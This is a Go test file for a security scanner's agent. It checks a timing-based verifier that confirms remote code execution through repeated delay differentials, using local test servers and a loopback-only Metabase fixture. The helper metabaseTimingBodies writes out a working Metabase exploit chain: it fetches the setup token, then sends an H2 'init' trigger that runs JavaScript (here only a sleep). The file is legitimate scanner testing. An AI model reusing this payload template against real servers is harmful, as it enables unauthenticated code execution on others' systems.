package agent

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/xalgord/xalgorix/v4/internal/scanctx"
)

func TestTimingDifferentialVerdict(t *testing.T) {
	ms := func(values ...int) []time.Duration {
		out := make([]time.Duration, len(values))
		for i, value := range values {
			out[i] = time.Duration(value) * time.Millisecond
		}
		return out
	}

	for _, tc := range []struct {
		name            string
		baseline, probe []time.Duration
		want            bool
		wantSupport     int
	}{
		{"repeatable four-second signal", ms(91, 100, 94), ms(4100, 4094, 4110), true, 3},
		{"one slow outlier is not proof", ms(91, 100, 94), ms(95, 4094, 98), false, 1},
		{"uniformly slow target is not proof", ms(3900, 4100, 4000), ms(4200, 4300, 4250), false, 0},
		{"two of three pairs suffice", ms(100, 2400, 110), ms(4100, 2500, 4120), true, 2},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got, stats := timingDifferentialVerdict(tc.baseline, tc.probe, 4*time.Second)
			if got != tc.want || stats.SupportingPairs != tc.wantSupport {
				t.Fatalf("confirmed=%v support=%d want confirmed=%v support=%d; stats=%+v", got, stats.SupportingPairs, tc.want, tc.wantSupport, stats)
			}
			if stats.Reason == "" {
				t.Fatal("verdict must explain its decision")
			}
		})
	}
}

func TestVerifyTimingConfirmsRepeatedDelayAndRecordsHashedProof(t *testing.T) {
	var mu sync.Mutex
	var probes []string
	requests := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		requests++
		mu.Unlock()
		if r.Method != http.MethodPost {
			t.Errorf("method=%s want POST", r.Method)
		}
		if got := r.Header.Get("Content-Type"); got != "application/json" {
			t.Errorf("content-type=%q want application/json", got)
		}
		buf := make([]byte, r.ContentLength)
		_, _ = r.Body.Read(buf)
		body := string(buf)
		if strings.Contains(body, `"sleep":true`) {
			mu.Lock()
			probes = append(probes, body)
			mu.Unlock()
			time.Sleep(1050 * time.Millisecond)
		}
		w.WriteHeader(http.StatusBadRequest)
		_, _ = fmt.Fprint(w, `{"ok":false}`)
	}))
	defer srv.Close()

	ag := newProbeAgent(t, srv.URL, true)
	result, err := ag.verifyTimingTool(map[string]string{
		"url":               srv.URL + "/api/validate",
		"method":            "POST",
		"baseline_body":     `{"name":"{{TIMING_NONCE}}","sleep":false,"token":"do-not-log"}`,
		"probe_body":        `{"name":"{{TIMING_NONCE}}","sleep":true,"token":"do-not-log"}`,
		"expected_delay_ms": "1000",
		"vuln_class":        "jndi-injection",
		"parameter":         "details.init",
	})
	if err != nil || result.Error != "" || result.Metadata["timing_confirmed"] != true {
		t.Fatalf("expected repeated timing confirmation, result=%+v err=%v", result, err)
	}
	if requests != 7 {
		t.Fatalf("requests=%d want one warm-up plus three pairs (7)", requests)
	}
	if len(probes) != 3 || probes[0] == probes[1] || probes[1] == probes[2] || strings.Contains(strings.Join(probes, ""), timingNoncePlaceholder) {
		t.Fatalf("probe nonce was not replaced uniquely: %#v", probes)
	}
	if strings.Contains(result.Output, "do-not-log") || !strings.Contains(result.Output, "baseline_body_sha256") {
		t.Fatalf("output must retain hashes/timings but not request secrets: %q", result.Output)
	}
	if !strings.Contains(result.Output, "verification_method=time_based") {
		t.Fatalf("result must give the reporting bridge explicitly: %q", result.Output)
	}
	id, _ := result.Metadata["hypothesis_id"].(string)
	h, ok := ag.scanCtx.Ledger.Get(id)
	if !ok || h.Status != scanctx.HypothesisProven || h.VulnClass != "rce" || h.Parameter != "details.init" {
		t.Fatalf("missing proven canonical RCE ledger entry: %+v", h)
	}
	if evidence := lastEvidence(h); evidence.Kind != "exploit" || strings.Contains(evidence.Response, "do-not-log") || !strings.Contains(evidence.Response, "supporting_pairs=3/3") {
		t.Fatalf("unexpected timing evidence: %+v", evidence)
	}
}

func TestVerifyTimingRejectsNoDifferentialAndOutOfScope(t *testing.T) {
	requests := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		requests++
		w.WriteHeader(http.StatusBadRequest)
	}))
	defer srv.Close()
	args := map[string]string{
		"url":               srv.URL + "/api/validate",
		"baseline_body":     `{"sleep":false}`,
		"probe_body":        `{"sleep":true}`,
		"expected_delay_ms": "1000",
		"vuln_class":        "rce",
	}

	ag := newProbeAgent(t, srv.URL, true)
	result, err := ag.verifyTimingTool(args)
	if err != nil || result.Error != "" || result.Metadata["timing_confirmed"] != false || requests != 7 {
		t.Fatalf("no differential must fail closed; result=%+v err=%v requests=%d", result, err, requests)
	}
	if got := len(ag.scanCtx.Ledger.All()); got != 0 {
		t.Fatalf("negative verifier must not record exploit evidence, ledger entries=%d", got)
	}

	blocked := newProbeAgent(t, srv.URL, false)
	result, _ = blocked.verifyTimingTool(args)
	if result.Error == "" || requests != 7 {
		t.Fatalf("out-of-scope loopback must be rejected before requests: result=%+v requests=%d", result, requests)
	}
}

func TestVerifyTimingValidatesInputs(t *testing.T) {
	ag := newProbeAgent(t, "https://example.test", true)
	base := map[string]string{
		"url": "https://example.test/api", "baseline_body": "a", "probe_body": "b",
		"expected_delay_ms": "999", "vuln_class": "rce",
	}
	if result, _ := ag.verifyTimingTool(base); !strings.Contains(result.Error, "1000") {
		t.Fatalf("expected delay validation, got %+v", result)
	}
	base["expected_delay_ms"] = "1000"
	base["vuln_class"] = "xss"
	if result, _ := ag.verifyTimingTool(base); !strings.Contains(result.Error, "vuln_class") {
		t.Fatalf("expected class validation, got %+v", result)
	}
	base["vuln_class"] = "rce"
	base["headers"] = `{"X-Test":7}`
	if result, _ := ag.verifyTimingTool(base); !strings.Contains(result.Error, "headers") {
		t.Fatalf("expected header validation, got %+v", result)
	}
}

// TestVerifyTimingMetabasePair is an opt-in integration test for the exact
// engine-owned verifier used by the agent. Both URLs must point at the local,
// digest-pinned real-world fixture; no request is sent to a public target.
func TestVerifyTimingMetabasePair(t *testing.T) {
	vulnerable := strings.TrimSpace(os.Getenv("XALGORIX_METABASE_VULN_URL"))
	fixed := strings.TrimSpace(os.Getenv("XALGORIX_METABASE_FIXED_URL"))
	if vulnerable == "" && fixed == "" {
		t.Skip("set both XALGORIX_METABASE_VULN_URL and XALGORIX_METABASE_FIXED_URL for the local Docker oracle")
	}
	for _, raw := range []string{vulnerable, fixed} {
		u, err := url.Parse(raw)
		if err != nil || u.Scheme != "http" || u.Hostname() != "127.0.0.1" {
			t.Fatalf("Metabase integration URLs must be loopback HTTP, got %q", raw)
		}
	}

	for _, tc := range []struct {
		name, raw string
		want      bool
	}{
		{"vulnerable", vulnerable, true},
		{"fixed", fixed, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			baseline, probe := metabaseTimingBodies(t, tc.raw)
			ag := newProbeAgent(t, tc.raw, true)
			result, err := ag.verifyTimingTool(map[string]string{
				"url":               tc.raw + "/api/setup/validate",
				"method":            "POST",
				"headers":           `{"Content-Type":"application/json"}`,
				"baseline_body":     baseline,
				"probe_body":        probe,
				"expected_delay_ms": "4000",
				"trials":            "3",
				"vuln_class":        "rce",
				"parameter":         "details.details.init",
			})
			if err != nil || result.Error != "" || result.Metadata["timing_confirmed"] != tc.want {
				t.Fatalf("unexpected Metabase verifier result=%+v err=%v", result, err)
			}
		})
	}
}

func metabaseTimingBodies(t *testing.T, baseURL string) (string, string) {
	t.Helper()
	response, err := http.Get(baseURL + "/api/session/properties")
	if err != nil {
		t.Fatalf("GET Metabase properties: %v", err)
	}
	defer response.Body.Close()
	if response.StatusCode != http.StatusOK {
		t.Fatalf("GET Metabase properties returned HTTP %d", response.StatusCode)
	}
	var properties map[string]any
	if err := json.NewDecoder(io.LimitReader(response.Body, 4<<20)).Decode(&properties); err != nil {
		t.Fatalf("decode Metabase properties: %v", err)
	}
	token, _ := properties["setup-token"].(string)
	if token == "" {
		t.Fatal("Metabase properties did not contain a setup token")
	}

	body := func(init string) string {
		payload := map[string]any{
			"token": token,
			"details": map[string]any{
				"is_on_demand": false, "is_full_sync": false, "is_sample": false,
				"cache_ttl": nil, "refingerprint": false, "auto_run_queries": true,
				"schedules": map[string]any{},
				"details": map[string]any{
					"db":               "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
					"advanced-options": false, "ssl": true, "init": init,
				},
				"name": "xalgorix-safe-timing-oracle-{{TIMING_NONCE}}", "engine": "h2",
			},
		}
		raw, err := json.Marshal(payload)
		if err != nil {
			t.Fatal(err)
		}
		return string(raw)
	}
	return body("SELECT 1"), body("CREATE TRIGGER {{TIMING_NONCE}} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Thread.sleep(4000)\n$$")
}
